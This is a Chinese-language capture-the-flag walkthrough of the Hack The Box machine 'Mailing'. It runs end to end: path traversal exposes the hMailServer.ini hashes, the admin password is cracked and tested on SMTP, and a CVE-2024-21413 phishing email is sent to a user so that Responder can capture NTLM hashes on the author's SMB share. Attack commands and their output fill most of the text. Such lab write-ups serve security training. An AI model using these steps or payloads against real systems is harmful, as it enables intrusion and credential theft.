## Mailing
```
[★]$ nmap -sC -sV 10.129.232.39
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-26 02:10 CST
Nmap scan report for 10.129.232.39
Host is up (0.0091s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: RIGHTS=texkA0001 NAMESPACE CHILDREN IMAP4rev1 completed CAPABILITY ACL IMAP4 QUOTA SORT OK IDLE
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
993/tcp open  ssl/imap      hMailServer imapd
|_imap-capabilities: RIGHTS=texkA0001 NAMESPACE CHILDREN IMAP4rev1 completed CAPABILITY ACL IMAP4 QUOTA SORT OK IDLE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-26T08:10:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

[★]$ nmap -p 25,80,110,135,139,143,4445,465,587,993,5040,5985,7680,47001,49664,49666,49667,64959 -sCV 10.129.232.39
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-26 02:14 CST
Nmap scan report for 10.129.232.39
Host is up (0.0095s latency).

PORT      STATE    SERVICE     VERSION
25/tcp    open     smtp        hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open     http        Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp   open     pop3        hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp   open     msrpc       Microsoft Windows RPC
139/tcp   open     netbios-ssn Microsoft Windows netbios-ssn
143/tcp   open     imap        hMailServer imapd
|_imap-capabilities: RIGHTS=texkA0001 SORT CHILDREN IMAP4 CAPABILITY IDLE NAMESPACE OK IMAP4rev1 ACL completed QUOTA
465/tcp   open     ssl/smtp    hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
587/tcp   open     smtp        hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
993/tcp   open     ssl/imap    hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_imap-capabilities: RIGHTS=texkA0001 SORT CHILDREN IMAP4 CAPABILITY IDLE NAMESPACE OK IMAP4rev1 ACL completed QUOTA
|_ssl-date: TLS randomness does not represent time
4445/tcp  filtered upnotifyp
5040/tcp  open     unknown
5985/tcp  open     http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open     pando-pub?
47001/tcp open     http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open     msrpc       Microsoft Windows RPC
49666/tcp open     msrpc       Microsoft Windows RPC
49667/tcp open     msrpc       Microsoft Windows RPC
64959/tcp filtered unknown
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
#### 主机是Windows，基于IIS版本，它至少是10或服务器1016。
#### 优先级的枚举：
#### 在TCP 80上有一个网络服务器。重定向到mailing.htb SMB(445)。
#### 我还会注意到有许多与邮件相关的端口：POP3（110）、IMAP（143、993）、SMTP（465、587）。这些可能需要信用，尽管有可能枚举用户名。
#### WinRM（5985）也是打开的，所以如果我获得了信用，我将想要检查它们是否对远程用户有效。
#### 子域蛮力 Subdomain Brute Force
#### 考虑到在web服务器上使用基于名称的路由，我将使用ffuf来检查邮件的任何子域。但他们的反应不同。
```
[★]$ echo '10.129.232.39 mailing.htb' | sudo tee -a /etc/hosts
10.129.232.39 mailing.htb
```
#### 1.SMB -TCP 445
```
[★]$ netexec smb 10.129.232.39 -u guest -p ''
SMB         10.129.232.39   445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.129.232.39   445    MAILING          [-] MAILING\guest: STATUS_LOGON_FAILURE

[★]$ netexec smb 10.129.232.39 -u syareya -p 'syareya'
SMB         10.129.232.39   445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.129.232.39   445    MAILING          [-] MAILING\syareya:syareya STATUS_LOGON_FAILURE
[★]$ smbclient -N -L //10.129.232.39
session setup failed: NT_STATUS_ACCESS_DENIED
```
#### 2.Website -TCP 80
#### 该网站是为提供邮件服务器的组织提供的：在网页上点击 Installation:Download Instructions
#### 网站上有三个名字我会记下的。
#### “下载说明”按钮是http://mailing.htb/download.php?file=instructions.pdf的链接。这是一个16页的PDF文件，包含了在Windows和Ubuntu上设置邮件客户端的说明，涵盖了Windows mail和Thunderbird。文档中需要注意的一点是示例中使用的电子邮件地址：
![图片](mages\2026012601.png)
#### maya@mailing.htb与上面的名称匹配。我会注意到这一点，另外两个用户可能是ruy@mailing.htb和gregory@mailing.htb。
### 技术堆栈
#### HTTP响应头有一个很好的信息：
```
[★]$ burpsuite //这是本地拦截的数据

GET /download.php?file=instructions.pdf HTTP/1.1
Host: mailing.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://mailing.htb/
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```
#### Fn12抓取的信息：
![图片](mages\2026012602.png)
#### 它是IIS，同时运行ASP.NET和PHP。  PHP并不奇怪，因为我已经确定了download.php。
### Directory Brute Force 目录暴力破解
#### 我将对该站点运行feroxbuster，并包含-x php，aspx，因为我知道该站点是php，并检查ASP。NET文件以及：
```
```
#### 我已经知道download.php了，其他的看起来都没什么意思。
#### 3.Shell as maya
#### 泄漏管理员密码
#### 识别文件读取
#### 上面我注意到指令是从/download.php?file=instructions.pdf下载的。我将注意检查目录遍历/一般文件读取。通过一些尝试，我将获得文件读取工作：
```
[★]$ curl http://mailing.htb/download.php?file=../../windows/system32/drivers/etc/hosts
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost

127.0.0.1	mailing.htb
```
#### 值得注意的是，它与斜杠的另一种方式一样有效，只要它们被转义（所以\\）：
```
127.0.0.1	mailing.htb
┌─[us-dedivip-2]─[10.10.14.190]─[syareya55@htb-fervpntxsb]─[~]
└──╼ [★]$ curl 'http://mailing.htb/download.php?file=..\\..\\windows\\system32\\drivers\\etc\\hosts'
# Copyright (c) 1993-2009 Microsoft Corp.
<SNIP>同上
```
#### web服务器正在运行一个奇怪的位置，但如果我能够猜出它在C:\wwwroot，我可以阅读download.php的源代码：
```
[★]$ curl http://mailing.htb/download.php?file=../../wwwroot/download.php
<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];

    $file_path = 'C:/wwwroot/instructions/' . $file;
    if (file_exists($file_path)) {
        
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file_path).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        echo(file_get_contents($file_path));
        exit;
    } else {
        echo "File not found.";
    }
} else {
    echo "No file specified for download.";
}
?>
```
#### 它实际上只是将输入路径附加到基本路径并调用filegetcontents。这不是本地文件包含（LFI）漏洞，因为用文件获取内容获取的内容不作为PHP代码执行（这就是为什么我能够将其读取为PHP源代码）。这实际上是一个发布时的LFI，我会在Beyond Root中展示。
#### 恢复密码哈希
#### hMailServer将它的配置数据存储在hMailServer.ini中。有很多地方似乎可以根据不同的文档页面和搜索找到这个。我最终会找到这个论坛帖子，其中一个响应者建议C:\Program Files （x86）\ hMailServer\Bin\：
https://hmailserver.com/forum/viewtopic.php?t=39079
#### google搜索：通过数据库/文件夹而非图形用户界面更改帐户名称
![图片](mages\2026012603.png)
#### 我假设帐户表名称，你指的是电子邮件帐户名称。
#### 我不会用你问的方法做这件事。
#### 使用hMailAdmin修改Email帐户名称。请参阅此文档https://www.hmailserver.com/documentati…e账户
#### 要更改数据文件夹名称，请在位于C:\Program Files （x86）\ hMailServer\Bin中的hMailServer.ini中进行更改。
#### 然后，您很可能需要重新启动hMailserver服务以获取新的数据文件夹名称。
```
[★]$ curl 'http://mailing.htb/download.php?file=../../Program+Files+(x86)/hMailServer/bin/hMailServer.ini'
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```
#### 存储了两个哈希值，分别为AdministratorPassword和Password
#### 找回密码
#### 这些密码哈希值是 MD5 格式的，所以我把它们放到CrackStation里：
```
[★]$ echo "841bb5acfa6779ae432fd7a4e6600ba7" > hash1.txt
[★]$ echo "0a9f8ad8bf896b501dde74f08efd7e4c" > hash2.txt //没有解开
[★]$ ls /usr/share/wordlists/rockyou.txt.gz
/usr/share/wordlists/rockyou.txt.gz
[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
[★]$ gunzip rockyou.txt.gz
[★]$ hashcat -m 0 -a 0 hash1.txt  rockyou.txt
hashcat (v6.2.6) starting

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: 841bb5acfa6779ae432fd7a4e6600ba7
Time.Started.....: Mon Jan 26 03:39:04 2026 (0 secs)
Time.Estimated...: Mon Jan 26 03:39:04 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (hash2.txt)
Guess.Queue......: 1/2 (50.00%)
Speed.#2.........:     7039 H/s (0.00ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 1/1 (100.00%)
Rejected.........: 0/1 (0.00%)
Restore.Point....: 1/1 (100.00%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: 0a9f8ad8bf896b501dde74f08efd7e4c -> 0a9f8ad8bf896b501dde74f08efd7e4c

841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator

```
#### 这些凭据对服务器上的管理员用户无效：
```
[★]$ netexec smb mailing.htb -u administrtor -p 'homenetworkingadministrator'
SMB         10.129.232.39   445    MAILING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.129.232.39   445    MAILING          [-] MAILING\administrtor:homenetworkingadministrator STATUS_LOGON_FAILURE
```
### 验证邮件密码
#### 鉴于此凭据来自 hMailServer，它很可能可以用于登录 SMTP 发送邮件。我可以用 Python 验证这一点smtplib：
```
[★]$ python3
Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 
>>> import smtplib 
>>> server = smtplib.SMTP('mailing.htb:587')
>>> server.login('administrator@mailing.htb', 'homenetworkingadministrator')
(235, b'authenticated.')
```
#### 当尝试使用用户名“administrator”时失败，但当我使用“administrator@mailing.htb”时，它报告成功。
#### 我还可以使用swaks命令行邮件发送器，并apt install swaks加上相应的标志来避免实际发送任何邮件：--auth--quit-after
```
[★]$ swaks --auth-user 'administrator@mailing.htb' --auth LOGIN --auth-password homenetworkingadministrator --quit-after AUTH --server mailing.htb
=== Trying mailing.htb:25...
=== Connected to mailing.htb.
<-  220 mailing.htb ESMTP
 -> EHLO htb-6zy3nzikns
<-  250-mailing.htb
<-  250-SIZE 20480000
<-  250-AUTH LOGIN PLAIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
<-  334 UGFzc3dvcmQ6
 -> aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
<-  235 authenticated.
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```
#### 显示成功。如​​果我更改密码，则失败：
```
[★]$ swaks --auth-user 'administrator@mailing.htb' --auth LOGIN --auth-password bad_password --quit-after AUTH --server mailing.htb
=== Trying mailing.htb:25...
=== Connected to mailing.htb.
<-  220 mailing.htb ESMTP
 -> EHLO htb-6zy3nzikns
<-  250-mailing.htb
<-  250-SIZE 20480000
<-  250-AUTH LOGIN PLAIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
<-  334 UGFzc3dvcmQ6
 -> YmFkX3Bhc3N3b3Jk
<** 535 Authentication failed. Restarting authentication process.
*** No authentication type succeeded
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```
### CVE-2024-21413
#### google搜索：windows mail cve
#### 该 CVE 确实存在，但出现在关于 Outlook 的文章中。这是因为 Outlook 是一款更为常见的邮件客户端。而且，就连NIST关于此 CVE 的页面也指出：
#### 微软 Outlook 远程代码执行漏洞 不过，这个漏洞确实会影响 Outlook 和 Windows Mail。
#### Outlook（以及 Windows Mail）针对通过电子邮件传入的不同链接协议采取不同的安全措施。其中一项较为严格的措施是file://协议本身。研究人员发现，如果 URL 以“![任意内容]”结尾，则该安全措施将被失效，链接将直接在未经过额外安全处理的情况下进行处理。这意味着攻击者可以发送此类链接，当用户点击（或有时在预览窗格中打开）时，该链接会尝试向攻击者的 SMB 服务器进行身份验证，从而使攻击者能够捕获 NetNTLMv2 哈希值，并有可能破解用户的密码。
#### 此漏洞的初步验证将发送一个如下所示的 HTML 正文：
```
<html>
    <body>
        <img src="{base64_image_string}" alt="Image"><br />
        <h1><a href="file:///{link_url}!poc">CVE-2024-21413 PoC.</a></h1>
    </body>
    </html>
```
#### 只需在预览窗口中打开此链接，Windows Mail 就会尝试{link_url}通过 SMB 加载。
#### GitHub 上 xaitax 提供了一个可靠的POC 漏洞利用程序，它可以生成 HTML 邮件并发送出去。我会把这个仓库克隆到我的主机上
```
[★]$ git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
Cloning into 'CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability'...
remote: Enumerating objects: 28, done.
remote: Counting objects: 100% (28/28), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 28 (delta 7), reused 6 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (28/28), 14.48 KiB | 7.24 MiB/s, done.
Resolving deltas: 100% (7/7), done.
[★]$ cd CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
[~/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability][★]$ ls
CVE-2024-21413.py  README.md
```
```
--server mailing.htb -目标服务器。
--port 587如果我尝试使用 25 端口，脚本会报错：“❌ 邮件发送失败：服务器不支持 STARTTLS 扩展。” 它需要 TLS 协议。587 是 POC 中使用的示例端口README.md。
--username administrator@mailing.htb -泄露的用户名来自hMailServer.ini.
--password homenetworkingadministrator -已破解泄露的密码哈希值hMailServer.ini。
--sender 0xdf@mailing.htb- 没关系。
--recipient maya@mailing.htb -首先以 Maya 为目标，但也可以尝试其他软件。
--url "\\10.10.14.6\share\sploit" -必须是我虚拟机上的 SMB 共享，不过具体路径并不重要。
--subject "Check this out ASAP!" -在这里并不重要，但我希望它是会被打开的东西。
```
#### 运行此程序即可发送邮件：
```
[★]$ python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender syareya@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.93\share\sploit" --subject "Check this out ASAP!"

CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

✅ Email sent successfully.
```
#### 为了捕获对我的主机的身份验证尝试，我将运行Responder：
```
[★]$ git clone https://github.com/SpiderLabs/Responder  //这个是python2.7的慎用


[★]$ sudo su
#git clone https://github.com/lgandx/Responder.git
Cloning into 'Responder'...
remote: Enumerating objects: 2757, done.
remote: Counting objects: 100% (917/917), done.
remote: Compressing objects: 100% (364/364), done.
remote: Total 2757 (delta 694), reused 553 (delta 553), pack-reused 1840 (from 5)
Receiving objects: 100% (2757/2757), 2.76 MiB | 21.28 MiB/s, done.

#cd Responder
[/home/syareya55/Responder]#ls
certs         LICENSE          poisoners         Responder.conf  utils.py
CHANGELOG.md  logs             pyproject.toml    Responder.py
Contributors  odict.py         README.md         servers
DumpHash.py   OSX_launcher.sh  Report.py         settings.py
files         packets.py       requirements.txt  tools

[/home/syareya55/Responder]#python3 -m pip --version
[/home/syareya55/Responder]#sudo pip3 install aioquic
```
#### 运行
```

[★]$ cd Responder 
[~/Responder][★]$ sudo ./Responder.py -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.93]
    Responder IPv6             [fe80::1019:d048:70ed:d8a6]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-T0903FQJW6N]
    Responder Domain Name      [URCQ.LOCAL]
    Responder DCE-RPC Port     [47028]

[*] Version: Responder 3.2.1.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[!] Error starting TCP server on port 80, check permissions or other servers running.




```
